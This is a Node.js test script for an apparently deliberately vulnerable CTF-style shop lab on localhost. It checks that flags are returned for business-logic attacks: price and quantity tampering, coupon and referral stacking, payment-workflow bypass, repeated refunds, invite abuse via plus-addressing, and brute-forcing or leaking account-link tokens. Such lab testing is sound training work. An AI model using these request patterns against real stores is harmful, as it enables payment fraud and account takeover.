const http = require("http");
function req(method, path, { cookies = "", body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const opts = { host: "localhost", port: 3000, path, method, headers: Object.assign({}, headers, cookies ? { Cookie: cookies } : {}, data ? { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } : {}) };
    const r = http.request(opts, (res) => { let c = []; res.on("data", (d) => c.push(d)); res.on("end", () => resolve({ status: res.statusCode, body: Buffer.concat(c).toString(), setCookie: res.headers["set-cookie"] || [], json: () => { try { return JSON.parse(Buffer.concat(c).toString()); } catch (e) { return null; } } })); });
    r.setTimeout(4000, () => r.destroy(new Error("timeout: " + method + " " + path)));
    r.on("error", reject);
    if (data) r.write(data);
    r.end();
  });
}
function cookieStr(setCookieArr, existing) {
  const jar = {};
  (existing || "").split(";").forEach((p) => { const [k, v] = p.trim().split("="); if (k) jar[k] = v; });
  (setCookieArr || []).forEach((sc) => { const [kv] = sc.split(";"); const [k, v] = kv.split("="); jar[k] = v; });
  return Object.entries(jar).filter(([k]) => k).map(([k, v]) => `${k}=${v}`).join("; ");
}
let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
function hasFlag(obj) { return JSON.stringify(obj).includes("FLAG{"); }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 40000).unref();

async function freshCookies(path) {
  const r = await req("GET", path);
  return cookieStr(r.setCookie, "");
}

async function run() {
  // ============================= price-tampering =============================
  let r1 = await req("POST", "/vuln/price-tampering/checkout?difficulty=easy", { body: { items: [{ id: "widget", qty: 1, price: 0.01 }] } });
  check("price-tampering easy: client price trusted -> flag", hasFlag(r1.json()), JSON.stringify(r1.json()));

  let c2 = await freshCookies("/vuln/price-tampering?difficulty=medium");
  let r2 = await req("POST", "/vuln/price-tampering/checkout?difficulty=medium", { cookies: c2, body: { items: [{ id: "widget", qty: 1, price: 0.01 }] } });
  check("price-tampering medium: real catalog price used -> NO flag", !hasFlag(r2.json()) && r2.json().total === 49.99, JSON.stringify(r2.json()));
  let r3 = await req("POST", "/vuln/price-tampering/checkout?difficulty=medium", { cookies: c2, body: { items: [{ id: "premium-support", qty: -10, price: 999 }] } });
  check("price-tampering medium: negative qty -> flag", hasFlag(r3.json()), JSON.stringify(r3.json()));

  let c4 = await freshCookies("/vuln/price-tampering?difficulty=hard");
  let r4 = await req("POST", "/vuln/price-tampering/checkout?difficulty=hard", { cookies: c4, body: { items: [{ id: "widget", qty: -5, price: 49.99 }] } });
  check("price-tampering hard: negative qty now rejected -> NO flag", !hasFlag(r4.json()), JSON.stringify(r4.json()));
  let r5 = await req("POST", "/vuln/price-tampering/checkout?difficulty=hard", { cookies: c4, body: { items: [{ id: "widget", qty: 1, price: 49.99 }], giftWrapDiscount: -1000 } });
  check("price-tampering hard: unbounded giftWrapDiscount -> flag", hasFlag(r5.json()), JSON.stringify(r5.json()));

  // ============================= coupon-abuse =============================
  let c6 = await freshCookies("/vuln/coupon-abuse?difficulty=easy");
  let last6;
  for (let i = 0; i < 8; i++) last6 = await req("POST", "/vuln/coupon-abuse/apply?difficulty=easy", { cookies: c6, body: { code: "WELCOME10" } });
  check("coupon-abuse easy: repeated application compounds -> flag", hasFlag(last6.json()), JSON.stringify(last6.json()));

  let c7 = await freshCookies("/vuln/coupon-abuse?difficulty=medium");
  let r7a = await req("POST", "/vuln/coupon-abuse/apply?difficulty=medium", { cookies: c7, body: { code: "WELCOME10" } });
  let r7b = await req("POST", "/vuln/coupon-abuse/apply?difficulty=medium", { cookies: c7, body: { code: "WELCOME10" } });
  check("coupon-abuse medium: exact repeat blocked -> NO flag", !hasFlag(r7b.json()) && r7b.json().applied === false, JSON.stringify(r7b.json()));
  let r7c = await req("POST", "/vuln/coupon-abuse/apply?difficulty=medium", { cookies: c7, body: { code: "WELCOME10 " } }); // trailing space
  check("coupon-abuse medium: trailing-space variant bypasses -> applied AND flag", r7c.json().applied === true && hasFlag(r7c.json()), JSON.stringify(r7c.json()));

  let c8 = await freshCookies("/vuln/coupon-abuse?difficulty=hard");
  await req("POST", "/vuln/coupon-abuse/apply?difficulty=hard", { cookies: c8, body: { code: "WELCOME10 " } }); // should now be normalized & blocked as dup on 2nd try
  let r8b = await req("POST", "/vuln/coupon-abuse/apply?difficulty=hard", { cookies: c8, body: { code: "welcome10" } });
  check("coupon-abuse hard: normalized dedup blocks case-variant", r8b.json().applied === false, JSON.stringify(r8b.json()));
  let r8c = await req("POST", "/vuln/coupon-abuse/apply?difficulty=hard", { cookies: c8, body: { code: "NOPE", referralCode: "WELCOME10" } });
  check("coupon-abuse hard: referralCode stacking -> flag", hasFlag(r8c.json()), JSON.stringify(r8c.json()));

  // ============================= workflow-bypass =============================
  let r9 = await req("POST", "/vuln/workflow-bypass/confirm?difficulty=easy");
  check("workflow-bypass easy: confirm with no payment at all -> flag", hasFlag(r9.json()), JSON.stringify(r9.json()));

  let c10 = await freshCookies("/vuln/workflow-bypass?difficulty=medium");
  let r10a = await req("POST", "/vuln/workflow-bypass/confirm?difficulty=medium", { cookies: c10 });
  check("workflow-bypass medium: confirm without /pay -> NO flag", !hasFlag(r10a.json()) && r10a.json().orderCompleted === false);
  await req("POST", "/vuln/workflow-bypass/pay?difficulty=medium", { cookies: c10, body: {} });
  let r10b = await req("POST", "/vuln/workflow-bypass/confirm?difficulty=medium", { cookies: c10 });
  check("workflow-bypass medium: /pay never verifies anything -> flag", hasFlag(r10b.json()), JSON.stringify(r10b.json()));

  let c11 = await freshCookies("/vuln/workflow-bypass?difficulty=hard");
  let tokResp = await req("GET", "/vuln/workflow-bypass/get-payment-token?difficulty=hard&amount=49.99", { cookies: c11 });
  const paymentToken = tokResp.json().paymentToken;
  await req("POST", "/vuln/workflow-bypass/pay?difficulty=hard", { cookies: c11, body: { paymentToken, amount: 49.99 } });
  await req("POST", "/vuln/workflow-bypass/set-cart?difficulty=hard", { cookies: c11, body: { amount: 999.0 } });
  let r11 = await req("POST", "/vuln/workflow-bypass/confirm?difficulty=hard", { cookies: c11 });
  check("workflow-bypass hard: paid amount never re-checked against switched cart -> flag", hasFlag(r11.json()), JSON.stringify(r11.json()));

  // ============================= refund-abuse =============================
  let r12 = await req("POST", "/vuln/refund-abuse/refund?difficulty=easy", { body: { amount: 2000 } });
  check("refund-abuse easy: unbounded refund -> flag", hasFlag(r12.json()), JSON.stringify(r12.json()));

  let c13 = await freshCookies("/vuln/refund-abuse?difficulty=medium");
  let r13a = await req("POST", "/vuln/refund-abuse/refund?difficulty=medium", { cookies: c13, body: { amount: 2000 } });
  check("refund-abuse medium: single-call amount capped", r13a.json().refundedThisCall === 200, JSON.stringify(r13a.json()));
  await req("POST", "/vuln/refund-abuse/refund?difficulty=medium", { cookies: c13, body: { amount: 200 } });
  let r13c = await req("POST", "/vuln/refund-abuse/refund?difficulty=medium", { cookies: c13, body: { amount: 200 } });
  check("refund-abuse medium: repeatable calls -> flag", hasFlag(r13c.json()), JSON.stringify(r13c.json()));

  let c14 = await freshCookies("/vuln/refund-abuse?difficulty=hard");
  await req("POST", "/vuln/refund-abuse/refund?difficulty=hard", { cookies: c14, body: { amount: 200 } });
  let r14b = await req("POST", "/vuln/refund-abuse/refund?difficulty=hard", { cookies: c14, body: { amount: 200 } });
  check("refund-abuse hard: main endpoint now single-use -> NO flag yet", !hasFlag(r14b.json()) && r14b.json().refundedThisCall === 0);
  let r14c = await req("POST", "/vuln/refund-abuse/partial-refund?difficulty=hard", { cookies: c14, body: { amount: 150 } });
  check("refund-abuse hard: partial-refund endpoint ignores cross-endpoint total -> flag", hasFlag(r14c.json()), JSON.stringify(r14c.json()));

  // ============================= invitation-abuse =============================
  let c15 = await freshCookies("/vuln/invitation-abuse?difficulty=easy");
  let last15;
  for (let i = 0; i < 5; i++) last15 = await req("POST", "/vuln/invitation-abuse/redeem?difficulty=easy", { cookies: c15, body: { email: "victim@example.test" } });
  check("invitation-abuse easy: same email repeatedly -> flag", hasFlag(last15.json()), JSON.stringify(last15.json()));

  let c16 = await freshCookies("/vuln/invitation-abuse?difficulty=medium");
  await req("POST", "/vuln/invitation-abuse/redeem?difficulty=medium", { cookies: c16, body: { email: "victim@example.test" } });
  let r16b = await req("POST", "/vuln/invitation-abuse/redeem?difficulty=medium", { cookies: c16, body: { email: "victim@example.test" } });
  check("invitation-abuse medium: exact-email repeat blocked", r16b.json().credited === false);
  let last16c;
  for (let i = 0; i < 4; i++) last16c = await req("POST", "/vuln/invitation-abuse/redeem?difficulty=medium", { cookies: c16, body: { email: `victim+${i}@example.test` } });
  check("invitation-abuse medium: plus-addressing bypass -> flag", hasFlag(last16c.json()), JSON.stringify(last16c.json()));

  let c17 = await freshCookies("/vuln/invitation-abuse?difficulty=hard");
  let r17a = await req("POST", "/vuln/invitation-abuse/redeem?difficulty=hard", { cookies: c17, body: { email: "victim+1@example.test" } });
  let r17b = await req("POST", "/vuln/invitation-abuse/redeem?difficulty=hard", { cookies: c17, body: { email: "victim+2@example.test" } });
  check("invitation-abuse hard: plus-addressing now normalized away", r17a.json().credited === true && r17b.json().credited === false, JSON.stringify([r17a.json(), r17b.json()]));
  let last17c;
  for (let i = 0; i < 4; i++) last17c = await req("POST", "/vuln/invitation-abuse/bulk-invite?difficulty=hard", { cookies: c17, body: { email: `corp${i}@example.test` } });
  check("invitation-abuse hard: bulk-invite endpoint has no tracking -> flag", hasFlag(last17c.json()), JSON.stringify(last17c.json()));

  // ============================= account-linking-abuse =============================
  let r18setup = await req("GET", "/vuln/account-linking-abuse?difficulty=easy");
  const tokenMatchEasy = r18setup.body.match(/values? around (\d+)/);
  check("account-linking-abuse easy: victim token range shown", !!tokenMatchEasy, r18setup.body.slice(0, 200));
  let found18 = false, flagOut18;
  if (tokenMatchEasy) {
    const base = parseInt(tokenMatchEasy[1], 10);
    for (let t = 1000; t < 1021 && !found18; t++) {
      const rTry = await req("POST", "/vuln/account-linking-abuse/link?difficulty=easy", { body: { token: String(t) } });
      if (rTry.json().linked) { found18 = true; flagOut18 = rTry.json(); }
    }
  }
  check("account-linking-abuse easy: brute-forceable small token range -> flag", found18 && hasFlag(flagOut18), JSON.stringify(flagOut18));

  let r19setup = await req("GET", "/vuln/account-linking-abuse?difficulty=medium");
  const tokenMatchMedium = r19setup.body.match(/token is: <code>([a-z0-9_]+)</);
  check("account-linking-abuse medium: victim token disclosed for the exercise", !!tokenMatchMedium, r19setup.body.slice(0, 300));
  let r19 = await req("POST", "/vuln/account-linking-abuse/link?difficulty=medium", { body: { token: tokenMatchMedium[1] } });
  check("account-linking-abuse medium: token-exists-only check -> flag", hasFlag(r19.json()), JSON.stringify(r19.json()));

  let r20setup = await req("GET", "/vuln/account-linking-abuse?difficulty=hard");
  let r20 = await req("POST", "/vuln/account-linking-abuse/link?difficulty=hard", { body: { token: "lnk_0000000000" } });
  check("account-linking-abuse hard: main /link endpoint always rejects now", !hasFlag(r20.json()) && r20.json().linked === false, JSON.stringify(r20.json()));

  let r20log = await req("GET", "/vuln/account-linking-abuse/support-log?difficulty=hard");
  const leakedToken = (r20log.body.match(/token=([a-z0-9_]+)/) || [])[1];
  check("account-linking-abuse hard: token discoverable via support-log leak", !!leakedToken, r20log.body.slice(0, 300));
  let r21 = await req("POST", "/vuln/account-linking-abuse/link-via-support?difficulty=hard", { body: { token: leakedToken, targetUsername: "me" } });
  check("account-linking-abuse hard: link-via-support bypasses session-binding -> flag", hasFlag(r21.json()), JSON.stringify(r21.json()));
  let r22 = await req("POST", "/vuln/account-linking-abuse/link-via-support?difficulty=hard", { body: { token: "definitely-wrong", targetUsername: "me" } });
  check("account-linking-abuse hard: link-via-support rejects a wrong token", r22.json().linked === false);

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}
run().catch((e) => { console.error("ERROR:", e); process.exit(1); });
